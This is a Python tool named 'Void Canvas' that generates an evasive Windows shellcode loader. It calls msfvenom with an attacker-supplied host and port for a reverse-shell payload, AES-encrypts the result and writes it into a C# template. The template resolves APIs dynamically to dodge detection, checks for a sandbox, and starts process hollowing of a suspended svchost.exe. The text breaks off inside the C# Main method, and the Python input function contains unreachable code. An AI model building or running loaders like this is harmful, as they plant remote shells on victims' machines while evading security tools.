import os
import random
import string
import subprocess
import time
from Crypto.Cipher import AES
from tqdm import tqdm
from pyfiglet import Figlet

# Colors for terminal output
GREEN = '\033[0;32m'
RED = '\033[0;31m'
NC = '\033[0m'  # No Color

LAST_RUN_FILE = ".last_run"

# Function to generate a random 16-character alphanumeric key (For AES key)
def generate_key():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

# Function to generate a random noun for placeholders
def random_noun():
    nouns = ["Shadow", "Falcon", "Specter", "Wraith", "Phantom", "Hawk", "Raven", "Griffin", "Viper", "Drake"]
    return random.choice(nouns)

# Display Banner with Random Font
def display_banner():
    fig = Figlet(font=random.choice(Figlet().getFonts()))
    print(fig.renderText("Void Canvas"))

# Prompt for user input or reuse last run's values
def prompt_for_input():
    if os.path.exists(LAST_RUN_FILE):
        with open(LAST_RUN_FILE, "r") as f:
            last_values = f.read().splitlines()
            lhost, lport, payload = last_values
            print(f"{GREEN}[+] Use the same inputs from the last run? (LHOST: {lhost}, LPORT: {lport}, PAYLOAD: {payload}) [Y/n]{NC}")
            use_last = input().lower()
            if use_last in ["y", ""]:
                return lhost, lport, payload
    

    print(f"{GREEN}[+] Enter LHOST:{NC}")
    lhost = input()
    print(f"{GREEN}[+] Enter LPORT:{NC}")
    lport = input()
    print(f"{GREEN}[+] Enter payload (e.g., windows/x64/shell_reverse_tcp ):{NC}")
    payload = input()
    
    payload_file_path = input("Enter the path for an existing 'payload.raw' file (leave empty to generate a new payload): ")

    if payload_file_path:
        # Check if the file exists if the user provides a path
        if not os.path.exists(payload_file_path):
            print(f"[ERROR] The file {payload_file_path} does not exist!")
            exit(1)
        else:
            print(f"[INFO] Using provided payload file: {payload_file_path}")
    else:
        print("[INFO] No existing payload file provided, proceeding to generate a new payload.")

    return lhost, lport, payload, payload_file_path

    with open(LAST_RUN_FILE, "w") as f:
        f.write(f"{lhost}\n{lport}\n{payload}\n")

    return lhost, lport, payload

# AES Encryption function that returns byte array format with size
def encrypt_payload_to_byte_array_with_size(key, file_path):
    with open(file_path, 'rb') as f:
        data = f.read()

    # Pad the data to be AES block size (16 bytes) compatible
    pad = 16 - len(data) % 16
    data += bytes([pad]) * pad

    cipher = AES.new(key.encode(), AES.MODE_ECB)
    encrypted = cipher.encrypt(data)

    # Calculate the size and create the byte array
    size = len(encrypted)
    byte_array = ', '.join(f'0x{b:02x}' for b in encrypted)
    
    return size, byte_array

# Progress Tracker with Progress Bar
def progress_bar(task_name, duration=5):
    print(f"{GREEN}[+] {task_name} in progress...{NC}")
    for _ in tqdm(range(duration), desc=task_name, bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt}'):
        time.sleep(1)
    print(f"{GREEN}[+] {task_name} completed.{NC}")

# Generate MSFVenom payload
def generate_payload(lhost, lport, payload):
    output_payload = "payload.raw"
    print(f"{GREEN}[+] Generating MSFVenom payload...{NC}")
    try:
        subprocess.run(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} EXITFUNC=thread -a x64 --platform Windows -f raw -o {output_payload}", shell=True, check=True)
        print(f"{GREEN}[+] MSFVenom payload generated: {output_payload}{NC}")
    except subprocess.CalledProcessError:
        print(f"{RED}[-] Failed to generate payload with msfvenom.{NC}")
        exit(1)

# Generate C# code with AES decryption
def generate_cs_file(key, encrypted_shellcode, size):
    noun = random_noun()
    cs_content = f"""

using System;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;


namespace Underback
{{
    public class DELEGATES
    {{
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref STRUCTS.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STRUCTS.StartupInfo lpStartupInfo, out STRUCTS.ProcessInfo lpProcessInformation);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref STRUCTS.ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfbytesRW);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint ResumeThread(IntPtr hThread);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr GetCurrentProcess();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateMutexA(IntPtr lpMutexAttributes, bool bInitialOwner, string lpName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool GetProcessMemoryInfo(IntPtr hProcess, out STRUCTS.PROCESS_MEMORY_COUNTERS counters, uint size);

    }}
    public class STRUCTS
    {{
        // Structures and Enums 

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {{
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }}
        public enum NtStatus : uint
        {{
            // Success
            Success = 0x00000000,
            Wait0 = 0x00000000,
            Wait1 = 0x00000001,
            Wait2 = 0x00000002,
            Wait3 = 0x00000003,
            Wait63 = 0x0000003f,
            Abandoned = 0x00000080,
            AbandonedWait0 = 0x00000080,
            AbandonedWait1 = 0x00000081,
            AbandonedWait2 = 0x00000082,
            AbandonedWait3 = 0x00000083,
            AbandonedWait63 = 0x000000bf,
            UserApc = 0x000000c0,
            KernelApc = 0x00000100,
            Alerted = 0x00000101,
            Timeout = 0x00000102,
            Pending = 0x00000103,
            Reparse = 0x00000104,
            MoreEntries = 0x00000105,
            NotAllAssigned = 0x00000106,
            SomeNotMapped = 0x00000107,
            OpLockBreakInProgress = 0x00000108,
            VolumeMounted = 0x00000109,
            RxActCommitted = 0x0000010a,
            NotifyCleanup = 0x0000010b,
            NotifyEnumDir = 0x0000010c,
            NoQuotasForAccount = 0x0000010d,
            PrimaryTransportConnectFailed = 0x0000010e,
            PageFaultTransition = 0x00000110,
            PageFaultDemandZero = 0x00000111,
            PageFaultCopyOnWrite = 0x00000112,
            PageFaultGuardPage = 0x00000113,
            PageFaultPagingFile = 0x00000114,
            CrashDump = 0x00000116,
            ReparseObject = 0x00000118,
            NothingToTerminate = 0x00000122,
            ProcessNotInJob = 0x00000123,
            ProcessInJob = 0x00000124,
            ProcessCloned = 0x00000129,
            FileLockedWithOnlyReaders = 0x0000012a,
            FileLockedWithWriters = 0x0000012b,

            // Informational
            Informational = 0x40000000,
            ObjectNameExists = 0x40000000,
            ThreadWasSuspended = 0x40000001,
            WorkingSetLimitRange = 0x40000002,
            ImageNotAtBase = 0x40000003,
            RegistryRecovered = 0x40000009,

            // Warning
            Warning = 0x80000000,
            GuardPageViolation = 0x80000001,
            DatatypeMisalignment = 0x80000002,
            Breakpoint = 0x80000003,
            SingleStep = 0x80000004,
            BufferOverflow = 0x80000005,
            NoMoreFiles = 0x80000006,
            HandlesClosed = 0x8000000a,
            PartialCopy = 0x8000000d,
            DeviceBusy = 0x80000011,
            InvalidEaName = 0x80000013,
            EaListInconsistent = 0x80000014,
            NoMoreEntries = 0x8000001a,
            LongJump = 0x80000026,
            DllMightBeInsecure = 0x8000002b,

            // Error
            Error = 0xc0000000,
            Unsuccessful = 0xc0000001,
            NotImplemented = 0xc0000002,
            InvalidInfoClass = 0xc0000003,
            InfoLengthMismatch = 0xc0000004,
            AccessViolation = 0xc0000005,
            InPageError = 0xc0000006,
            PagefileQuota = 0xc0000007,
            InvalidHandle = 0xc0000008,
            BadInitialStack = 0xc0000009,
            BadInitialPc = 0xc000000a,
            InvalidCid = 0xc000000b,
            TimerNotCanceled = 0xc000000c,
            InvalidParameter = 0xc000000d,
            NoSuchDevice = 0xc000000e,
            NoSuchFile = 0xc000000f,
            InvalidDeviceRequest = 0xc0000010,
            EndOfFile = 0xc0000011,
            WrongVolume = 0xc0000012,
            NoMediaInDevice = 0xc0000013,
            NoMemory = 0xc0000017,
            NotMappedView = 0xc0000019,
            UnableToFreeVm = 0xc000001a,
            UnableToDeleteSection = 0xc000001b,
            IllegalInstruction = 0xc000001d,
            AlreadyCommitted = 0xc0000021,
            AccessDenied = 0xc0000022,
            BufferTooSmall = 0xc0000023,
            ObjectTypeMismatch = 0xc0000024,
            NonContinuableException = 0xc0000025,
            BadStack = 0xc0000028,
            NotLocked = 0xc000002a,
            NotCommitted = 0xc000002d,
            InvalidParameterMix = 0xc0000030,
            ObjectNameInvalid = 0xc0000033,
            ObjectNameNotFound = 0xc0000034,
            ObjectNameCollision = 0xc0000035,
            ObjectPathInvalid = 0xc0000039,
            ObjectPathNotFound = 0xc000003a,
            ObjectPathSyntaxBad = 0xc000003b,
            DataOverrun = 0xc000003c,
            DataLate = 0xc000003d,
            DataError = 0xc000003e,
            CrcError = 0xc000003f,
            SectionTooBig = 0xc0000040,
            PortConnectionRefused = 0xc0000041,
            InvalidPortHandle = 0xc0000042,
            SharingViolation = 0xc0000043,
            QuotaExceeded = 0xc0000044,
            InvalidPageProtection = 0xc0000045,
            MutantNotOwned = 0xc0000046,
            SemaphoreLimitExceeded = 0xc0000047,
            PortAlreadySet = 0xc0000048,
            SectionNotImage = 0xc0000049,
            SuspendCountExceeded = 0xc000004a,
            ThreadIsTerminating = 0xc000004b,
            BadWorkingSetLimit = 0xc000004c,
            IncompatibleFileMap = 0xc000004d,
            SectionProtection = 0xc000004e,
            EasNotSupported = 0xc000004f,
            EaTooLarge = 0xc0000050,
            NonExistentEaEntry = 0xc0000051,
            NoEasOnFile = 0xc0000052,
            EaCorruptError = 0xc0000053,
            FileLockConflict = 0xc0000054,
            LockNotGranted = 0xc0000055,
            DeletePending = 0xc0000056,
            CtlFileNotSupported = 0xc0000057,
            UnknownRevision = 0xc0000058,
            RevisionMismatch = 0xc0000059,
            InvalidOwner = 0xc000005a,
            InvalidPrimaryGroup = 0xc000005b,
            NoImpersonationToken = 0xc000005c,
            CantDisableMandatory = 0xc000005d,
            NoLogonServers = 0xc000005e,
            NoSuchLogonSession = 0xc000005f,
            NoSuchPrivilege = 0xc0000060,
            PrivilegeNotHeld = 0xc0000061,
            InvalidAccountName = 0xc0000062,
            UserExists = 0xc0000063,
            NoSuchUser = 0xc0000064,
            GroupExists = 0xc0000065,
            NoSuchGroup = 0xc0000066,
            MemberInGroup = 0xc0000067,
            MemberNotInGroup = 0xc0000068,
            LastAdmin = 0xc0000069,
            WrongPassword = 0xc000006a,
            IllFormedPassword = 0xc000006b,
            PasswordRestriction = 0xc000006c,
            LogonFailure = 0xc000006d,
            AccountRestriction = 0xc000006e,
            InvalidLogonHours = 0xc000006f,
            InvalidWorkstation = 0xc0000070,
            PasswordExpired = 0xc0000071,
            AccountDisabled = 0xc0000072,
            NoneMapped = 0xc0000073,
            TooManyLuidsRequested = 0xc0000074,
            LuidsExhausted = 0xc0000075,
            InvalidSubAuthority = 0xc0000076,
            InvalidAcl = 0xc0000077,
            InvalidSid = 0xc0000078,
            InvalidSecurityDescr = 0xc0000079,
            ProcedureNotFound = 0xc000007a,
            InvalidImageFormat = 0xc000007b,
            NoToken = 0xc000007c,
            BadInheritanceAcl = 0xc000007d,
            RangeNotLocked = 0xc000007e,
            DiskFull = 0xc000007f,
            ServerDisabled = 0xc0000080,
            ServerNotDisabled = 0xc0000081,
            TooManyGuidsRequested = 0xc0000082,
            GuidsExhausted = 0xc0000083,
            InvalidIdAuthority = 0xc0000084,
            AgentsExhausted = 0xc0000085,
            InvalidVolumeLabel = 0xc0000086,
            SectionNotExtended = 0xc0000087,
            NotMappedData = 0xc0000088,
            ResourceDataNotFound = 0xc0000089,
            ResourceTypeNotFound = 0xc000008a,
            ResourceNameNotFound = 0xc000008b,
            ArrayBoundsExceeded = 0xc000008c,
            FloatDenormalOperand = 0xc000008d,
            FloatDivideByZero = 0xc000008e,
            FloatInexactResult = 0xc000008f,
            FloatInvalidOperation = 0xc0000090,
            FloatOverflow = 0xc0000091,
            FloatStackCheck = 0xc0000092,
            FloatUnderflow = 0xc0000093,
            IntegerDivideByZero = 0xc0000094,
            IntegerOverflow = 0xc0000095,
            PrivilegedInstruction = 0xc0000096,
            TooManyPagingFiles = 0xc0000097,
            FileInvalid = 0xc0000098,
            InstanceNotAvailable = 0xc00000ab,
            PipeNotAvailable = 0xc00000ac,
            InvalidPipeState = 0xc00000ad,
            PipeBusy = 0xc00000ae,
            IllegalFunction = 0xc00000af,
            PipeDisconnected = 0xc00000b0,
            PipeClosing = 0xc00000b1,
            PipeConnected = 0xc00000b2,
            PipeListening = 0xc00000b3,
            InvalidReadMode = 0xc00000b4,
            IoTimeout = 0xc00000b5,
            FileForcedClosed = 0xc00000b6,
            ProfilingNotStarted = 0xc00000b7,
            ProfilingNotStopped = 0xc00000b8,
            NotSameDevice = 0xc00000d4,
            FileRenamed = 0xc00000d5,
            CantWait = 0xc00000d8,
            PipeEmpty = 0xc00000d9,
            CantTerminateSelf = 0xc00000db,
            InternalError = 0xc00000e5,
            InvalidParameter1 = 0xc00000ef,
            InvalidParameter2 = 0xc00000f0,
            InvalidParameter3 = 0xc00000f1,
            InvalidParameter4 = 0xc00000f2,
            InvalidParameter5 = 0xc00000f3,
            InvalidParameter6 = 0xc00000f4,
            InvalidParameter7 = 0xc00000f5,
            InvalidParameter8 = 0xc00000f6,
            InvalidParameter9 = 0xc00000f7,
            InvalidParameter10 = 0xc00000f8,
            InvalidParameter11 = 0xc00000f9,
            InvalidParameter12 = 0xc00000fa,
            MappedFileSizeZero = 0xc000011e,
            TooManyOpenedFiles = 0xc000011f,
            Cancelled = 0xc0000120,
            CannotDelete = 0xc0000121,
            InvalidComputerName = 0xc0000122,
            FileDeleted = 0xc0000123,
            SpecialAccount = 0xc0000124,
            SpecialGroup = 0xc0000125,
            SpecialUser = 0xc0000126,
            MembersPrimaryGroup = 0xc0000127,
            FileClosed = 0xc0000128,
            TooManyThreads = 0xc0000129,
            ThreadNotInProcess = 0xc000012a,
            TokenAlreadyInUse = 0xc000012b,
            PagefileQuotaExceeded = 0xc000012c,
            CommitmentLimit = 0xc000012d,
            InvalidImageLeFormat = 0xc000012e,
            InvalidImageNotMz = 0xc000012f,
            InvalidImageProtect = 0xc0000130,
            InvalidImageWin16 = 0xc0000131,
            LogonServer = 0xc0000132,
            DifferenceAtDc = 0xc0000133,
            SynchronizationRequired = 0xc0000134,
            DllNotFound = 0xc0000135,
            IoPrivilegeFailed = 0xc0000137,
            OrdinalNotFound = 0xc0000138,
            EntryPointNotFound = 0xc0000139,
            ControlCExit = 0xc000013a,
            PortNotSet = 0xc0000353,
            DebuggerInactive = 0xc0000354,
            CallbackBypass = 0xc0000503,
            PortClosed = 0xc0000700,
            MessageLost = 0xc0000701,
            InvalidMessage = 0xc0000702,
            RequestCanceled = 0xc0000703,
            RecursiveDispatch = 0xc0000704,
            LpcReceiveBufferExpected = 0xc0000705,
            LpcInvalidConnectionUsage = 0xc0000706,
            LpcRequestsNotAllowed = 0xc0000707,
            ResourceInUse = 0xc0000708,
            ProcessIsProtected = 0xc0000712,
            VolumeDirty = 0xc0000806,
            FileCheckedOut = 0xc0000901,
            CheckOutRequired = 0xc0000902,
            BadFileType = 0xc0000903,
            FileTooLarge = 0xc0000904,
            FormsAuthRequired = 0xc0000905,
            VirusInfected = 0xc0000906,
            VirusDeleted = 0xc0000907,
            TransactionalConflict = 0xc0190001,
            InvalidTransaction = 0xc0190002,
            TransactionNotActive = 0xc0190003,
            TmInitializationFailed = 0xc0190004,
            RmNotActive = 0xc0190005,
            RmMetadataCorrupt = 0xc0190006,
            TransactionNotJoined = 0xc0190007,
            DirectoryNotRm = 0xc0190008,
            CouldNotResizeLog = 0xc0190009,
            TransactionsUnsupportedRemote = 0xc019000a,
            LogResizeInvalidSize = 0xc019000b,
            RemoteFileVersionMismatch = 0xc019000c,
            CrmProtocolAlreadyExists = 0xc019000f,
            TransactionPropagationFailed = 0xc0190010,
            CrmProtocolNotFound = 0xc0190011,
            TransactionSuperiorExists = 0xc0190012,
            TransactionRequestNotValid = 0xc0190013,
            TransactionNotRequested = 0xc0190014,
            TransactionAlreadyAborted = 0xc0190015,
            TransactionAlreadyCommitted = 0xc0190016,
            TransactionInvalidMarshallBuffer = 0xc0190017,
            CurrentTransactionNotValid = 0xc0190018,
            LogGrowthFailed = 0xc0190019,
            ObjectNoLongerExists = 0xc0190021,
            StreamMiniversionNotFound = 0xc0190022,
            StreamMiniversionNotValid = 0xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
            CantOpenMiniversionWithModifyIntent = 0xc0190025,
            CantCreateMoreStreamMiniversions = 0xc0190026,
            HandleNoLongerValid = 0xc0190028,
            NoTxfMetadata = 0xc0190029,
            LogCorruptionDetected = 0xc0190030,
            CantRecoverWithHandleOpen = 0xc0190031,
            RmDisconnected = 0xc0190032,
            EnlistmentNotSuperior = 0xc0190033,
            RecoveryNotNeeded = 0xc0190034,
            RmAlreadyStarted = 0xc0190035,
            FileIdentityNotPersistent = 0xc0190036,
            CantBreakTransactionalDependency = 0xc0190037,
            CantCrossRmBoundary = 0xc0190038,
            TxfDirNotEmpty = 0xc0190039,
            IndoubtTransactionsExist = 0xc019003a,
            TmVolatile = 0xc019003b,
            RollbackTimerExpired = 0xc019003c,
            TxfAttributeCorrupt = 0xc019003d,
            EfsNotAllowedInTransaction = 0xc019003e,
            TransactionalOpenNotAllowed = 0xc019003f,
            TransactedMappingUnsupportedRemote = 0xc0190040,
            TxfMetadataAlreadyPresent = 0xc0190041,
            TransactionScopeCallbacksNotSet = 0xc0190042,
            TransactionRequiredPromotion = 0xc0190043,
            CannotExecuteFileInTransaction = 0xc0190044,
            TransactionsNotFrozen = 0xc0190045,

            MaximumNtStatus = 0xffffffff
        }}

        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {{
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }}

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {{
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }}

        [StructLayout(LayoutKind.Sequential)]
        public struct ProcessBasicInfo
        {{
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }}

        [StructLayout(LayoutKind.Sequential, Size = 40)]
        public struct PROCESS_MEMORY_COUNTERS
        {{
            public uint cb;
            public uint PageFaultCount;
            public uint PeakWorkingSetSize;
            public uint WorkingSetSize;
            public uint QuotaPeakPagedPoolUsage;
            public uint QuotaPagedPoolUsage;
            public uint QuotaPeakNonPagedPoolUsage;
            public uint QuotaNonPagedPoolUsage;
            public uint PagefileUsage;
            public uint PeakPagefileUsage;
        }}
    }}

    public class Invoke
    {{
        // Dinvoke core
        public static STRUCTS.NtStatus LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref STRUCTS.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)
        {{
            // Craft an array for the arguments
            object[] funcargs =
            {{
                PathToFile, dwFlags, ModuleFileName, ModuleHandle
            }};

            STRUCTS.NtStatus retValue = (STRUCTS.NtStatus)DynamicAPIInvoke(@"ntdll.dll", @"LdrLoadDll", typeof(DELEGATES.LdrLoadDll), ref funcargs);

            // Update the modified variables
            ModuleHandle = (IntPtr)funcargs[3];

            return retValue;
        }}
        /// <summary>
        /// Helper for getting the base address of a module loaded by the current process. This base
        /// address could be passed to GetProcAddress/LdrGetProcedureAddress or it could be used for
        /// manual export parsing. This function uses the .NET System.Diagnostics.Process class.
        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {{
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {{
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {{
                    return Mod.BaseAddress;
                }}
            }}
            return IntPtr.Zero;
        }}

        public static void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
        {{
            // Craft an array for the arguments
            object[] funcargs =
            {{
                DestinationString, SourceString
            }};

            DynamicAPIInvoke(@"ntdll.dll", @"RtlInitUnicodeString", typeof(DELEGATES.RtlInitUnicodeString), ref funcargs);

            // Update the modified variables
            DestinationString = (STRUCTS.UNICODE_STRING)funcargs[0];
        }}

        /// Resolves LdrLoadDll and uses that function to load a DLL from disk.
        /// "DLLPath" The path to the DLL on disk. Uses the LoadLibrary convention
        /// ntPtr base address of the loaded module or IntPtr.Zero if the module was not loaded successfully.
        public static IntPtr LoadModuleFromDisk(string DLLPath)
        {{
            STRUCTS.UNICODE_STRING uModuleName = new STRUCTS.UNICODE_STRING();
            RtlInitUnicodeString(ref uModuleName, DLLPath);

            IntPtr hModule = IntPtr.Zero;
            STRUCTS.NtStatus CallResult = LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);
            if (CallResult != STRUCTS.NtStatus.Success || hModule == IntPtr.Zero)
            {{
                return IntPtr.Zero;
            }}

            return hModule;
        }}

        /// <summary>
        /// Dynamically invoke an arbitrary function from a DLL, providing its name, function prototype, and arguments.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="DLLName">Name of the DLL.</param>
        /// <param name="FunctionName">Name of the function.</param>
        /// <param name="FunctionDelegateType">Prototype for the function, represented as a Delegate object.</param>
        /// <param name="Parameters">Parameters to pass to the function. Can be modified if function uses call by reference.</param>
        /// <returns>Object returned by the function. Must be unmarshalled by the caller.</returns>
        public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
        {{
            IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
            return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
        }}

        /// <summary>
        /// Dynamically invokes an arbitrary function from a pointer. Useful for manually mapped modules or loading/invoking unmanaged code from memory.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="FunctionPointer">A pointer to the unmanaged function.</param>
        /// <param name="FunctionDelegateType">Prototype for the function, represented as a Delegate object.</param>
        /// <param name="Parameters">Arbitrary set of parameters to pass to the function. Can be modified if function uses call by reference.</param>
        /// <returns>Object returned by the function. Must be unmarshalled by the caller.</returns>
        public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
        {{
            Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
            return funcDelegate.DynamicInvoke(Parameters);
        }}

        /// Given a module base address, resolve the address of a function by manually walking the module export table.
        /// "ModuleBase" A pointer to the base address where the module is loaded in the current process.
        /// "ExportName" The name of the export to search for (e.g. "NtAlertResumeThread")
        /// IntPtr for the desired function.
        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
        {{
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {{
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {{
                    pExport = OptHeader + 0x60;
                }}
                else
                {{
                    pExport = OptHeader + 0x70;
                }}

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Loop the array of export name RVA
                for (int i = 0; i < NumberOfNames; i++)
                {{
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {{
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }}
                }}
            }}
            catch
            {{
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }}

            if (FunctionPtr == IntPtr.Zero)
            {{
                // Export not found
                throw new MissingMethodException(ExportName + ", export not found.");
            }}
            return FunctionPtr;
        }}

        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
        {{
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero && CanLoadFromDisk)
            {{
                hModule = LoadModuleFromDisk(DLLName);
                if (hModule == IntPtr.Zero)
                {{
                    throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
                }}
            }}
            else if (hModule == IntPtr.Zero)
            {{
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }}

            return GetExportAddress(hModule, FunctionName);
        }}
    }}
    public static class Funk
    {{
        private static T[] SubArray<T>(this T[] data, int index, int length)
        {{
            T[] result = new T[length];
            Array.Copy(data, index, result, 0, length);
            return result;
        }}

        //--------------------------------------------------------------------------------------------------
        // Decrypts the given a plaintext message byte array with a given 128 bits key
        // Returns the unencrypted message
        //--------------------------------------------------------------------------------------------------
        private static byte[] aesDecrypt(byte[] cipher, byte[] key)
        {{
            var IV = cipher.SubArray(0, 16);
            //var encryptedMessage = cipher.SubArray(16, cipher.Length - 16);

            // Create an AesManaged object with the specified key and IV.
            using (AesManaged aes = new AesManaged())
            {{
                aes.Padding = PaddingMode.Zeros;
                aes.KeySize = 128;
                aes.Key = key;
                aes.IV = IV;
                aes.Mode = CipherMode.ECB;

                using (MemoryStream ms = new MemoryStream())
                {{
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {{
                        cs.Write(cipher, 0, cipher.Length);
                    }}

                    return ms.ToArray();
                }}
            }}
        }}


        public static void Main(string[] args)
        {{
            // If the app can open a system process, it probably means that we are probably in a sandbox
            IntPtr pointer = Invoke.GetLibraryAddress("kernel32.dll", "OpenProcess");
            DELEGATES.OpenProcess opr = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.OpenProcess)) as DELEGATES.OpenProcess;

            /*
             * DO NOT USE AN MSFVENOM ENCODERS WITH THIS.  e.g. x64/xor_dynamic
             * see python script "aes-encode.py" for generating this payload
            */
            byte[] buf = new byte[{size}] {{ {encrypted_shellcode} }};

            // add your decrypt key here
            byte[] pie = aesDecrypt(buf, UTF8Encoding.UTF8.GetBytes("{key}"));
            // Start 'svchost.exe' in a suspended state
            STRUCTS.StartupInfo sInfo = new STRUCTS.StartupInfo();
            STRUCTS.ProcessInfo pInfo = new STRUCTS.ProcessInfo();

            pointer = Invoke.GetLibraryAddress("kernel32.dll", "CreateProcessA");
            DELEGATES.CreateProcessA cp = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.CreateProcessA)) as DELEGATES.CreateProcessA;

